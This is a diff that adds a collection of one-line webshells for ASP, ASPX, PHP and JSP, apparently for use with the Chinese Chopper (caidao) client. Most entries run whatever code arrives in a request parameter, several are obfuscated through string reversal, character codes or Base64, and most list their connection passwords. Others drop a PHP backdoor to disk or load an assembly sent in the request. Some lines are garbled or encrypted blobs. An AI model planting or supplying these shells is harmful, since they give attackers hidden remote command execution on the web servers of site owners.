@@ -1,0 +1,89 @@
+======================================================
+					ASP“ªæ‰ª∞
+======================================================
+----------------------------------------
+<%
+<!-- caidao setting input:<O>sb=eval(request(0))</O>,connecting pass:0 -->
+re= request("sb")
+if re <>"" then
+execute re
+response.end
+end if
+%>
+----------------------------------------
+<% 
+Function MorfiCoder(Code) 
+  MorfiCoder=Replace(Replace(StrReverse(Code),"/*/",""""),"\*\",vbCrlf) 
+End Function 
+Execute MorfiCoder(")/*/z/*/(tseuqer lave") 
+%>
+Password: z
+----------------------------------------
+<%a=request("cmd")%><%eval a%>
+----------------------------------------
+<%eval (eval(chr(114)+chr(101)+chr(113)+chr(117)+chr(101)+chr(115)+chr(116))("a"))%>
+----------------------------------------
+<%execute(request("xiaoma"))%>
+----------------------------------------
+1":eval request("a")'
+----------------------------------------
+"%><%eval request("a")%><%'" 
+----------------------------------------
+<%Y=request("x")%> <%execute(Y)%>
+----------------------------------------
+<%eval request("xiaoma")%>
+----------------------------------------
+º”√‹ ©‡∞YŒ€†Ñü®î≥¨õ°≈°‘©Õê˜  password: a
+----------------------------------------
+======================================================
+					ASPX“ªæ‰ª∞
+======================================================
+----------------------------------------
+<%@ Page Language = Jscript %><%var/*-/*-*/P/*-/*-*/=/*-/*-*/"e"+"v"+/*-/*-*/"a"+"l"+"("+"R"+"e"+/*-/*-*/"q"+"u"+"e"/*-/*-*/+"s"+"t"+"[/*-/*-*/0/*-/*-*/-/*-/*-*/2/*-/*-*/-/*-/*-*/5/*-/*-*/]"+","+"\""+"u"+"n"+"s"/*-/*-*/+"a"+"f"+"e"+"\""+")";eval (/*-/*-*/P/*-/*-*/,/*-/*-*/"u"+"n"+"s"/*-/*-*/+"a"+"f"+"e"/*-/*-*/);%>
+----------------------------------------
+<% @Page Language="Jscript"%><%eval(Request.Item["hucxsz"],"unsafe");%>
+----------------------------------------
+<script type="text/javascript" language="C#">// <![CDATA[
+ WebAdmin2Y.x.y aaaaa = new WebAdmin2Y.x.y("add6bb58e139be10"); // ]]></script>
+Password: webadmin
+----------------------------------------
+<script runat="server" language="JScript"> 
+   function popup(str) { 
+  var q = "u"; 
+  var w = "afe"; 
+  var a = q + "ns" + w; 
+  var b= eval(str,a); 
+  return(b); 
+   } 
+</script> 
+<% 
+popup(popup(System.Text.Encoding.GetEncoding(65001).GetString(System.Convert.FromBase64String("UmVxdWVzdC5JdGVtWyJ6Il0=")))); 
+%>
+Password: z
+----------------------------------------
+<%@ Page Language="Jscript"%><%Response.Write(eval(Request.Item["xiaoma"],"unsafe"));%>
+----------------------------------------
+<%@ Page Language="C#" ValidateRequest="false" %>
+<%try{ System.Reflection.Assembly.Load(Request.BinaryRead(int.Parse(Request.Cookies["f4ck"].Value))).CreateInstance("c", true, System.Reflection.BindingFlags.Default, null, new object[] { this }, null, null); } catch { }%>
+=====================================================
+					PHP“ªæ‰ª∞
+=====================================================
+<?php eval($_POST[xiaoma]);?>
+----------------------------------------
+<?php $_GET['ts7']($_POST['cmd']);?>
+//caidao: http://www.target.com/shell.php?ts7=assert
+----------------------------------------
+Zend 2004072203 3 148 373 x?
+?’ÍA˘y
+æâyy©ï?Q«eldjdjf,J¿’Jinn•^bJJ?á™c 5‘@\8á¬›ŒM
+P®·P?T…M?,T?C|Äp?ix°å¢÷?913%1™J?2W{–HÜ ∆a-c°í¢p??f®¸<^ÄF?N ?#?
+//zend_encode password: caidao
+----------------------------------------
+<?fputs(fopen("test.php","w"),'<?php eval($_POST["cmd"]);?>');?>
+----------------------------------------
+=====================================================
+					JSP“ªæ‰ª∞
+=====================================================
+----------------------------------------
+<%if(request.getParameter("f")!=null)(new java.io.FileOutputStream(application.getRealPath("\")+request.getParameter("f"))).write(request.getParameter("t").getBytes());%>
+----------------------------------------
